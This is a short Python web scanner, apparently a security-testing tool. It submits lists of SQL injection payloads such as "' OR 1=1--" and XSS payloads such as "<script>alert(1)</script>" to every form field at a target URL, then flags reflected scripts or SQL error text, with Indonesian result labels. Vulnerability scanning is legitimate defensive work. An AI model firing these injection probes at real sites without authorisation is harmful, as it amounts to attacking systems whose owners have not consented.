import requests
import re
import sys
import json
from formDetector import detect_form

sqli_payloads = [
    "' OR 1=1--",
    "admin' --",
    "' UNION SELECT NULL,NULL--",
    "' OR 'a'='a",
    "1 OR 1=1"
]

xss_payloads = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    '<svg onload=alert(1)>',
    '<iframe src=javascript:alert(1)></iframe>'
]

def test_injection(url, method, action, inputs, payloads, type='xss'):
    results = []
    for payload in payloads:
        data = {inp['name']: payload for inp in inputs if 'name' in inp}
        target = action if action.startswith('http') else url.rstrip('/') + '/' + action.lstrip('/')
        try:
            if method.lower() == 'get':
                r = requests.get(target, params=data, timeout=5, allow_redirects=False)
            else:
                r = requests.post(target, data=data, timeout=5, allow_redirects=False)

            if type == 'xss' and any(p in r.text for p in [payload]):
                results.append({'payload': payload, 'result': 'XSS tercermin'})
            elif type == 'sqli' and re.search(r'sql|syntax|mysql|error', r.text, re.I):
                results.append({'payload': payload, 'result': 'SQLi terdeteksi'})

        except Exception as e:
            results.append({'payload': payload, 'result': f'Error: {str(e)}'})
    return results

if __name__ == '__main__':
    url = sys.argv[1]
    xss_results = []
    sqli_results = []

    forms = detect_form(url)
    for form in forms:
        method = form.get('method', 'get')
        action = form.get('action', url)
        inputs = form.get('inputs', [])
        xss_results.extend(test_injection(url, method, action, inputs, xss_payloads, type='xss'))
        sqli_results.extend(test_injection(url, method, action, inputs, sqli_payloads, type='sqli'))

    print(json.dumps({
        "xss_results": xss_results,
        "sqli_results": sqli_results
    }, ensure_ascii=False))
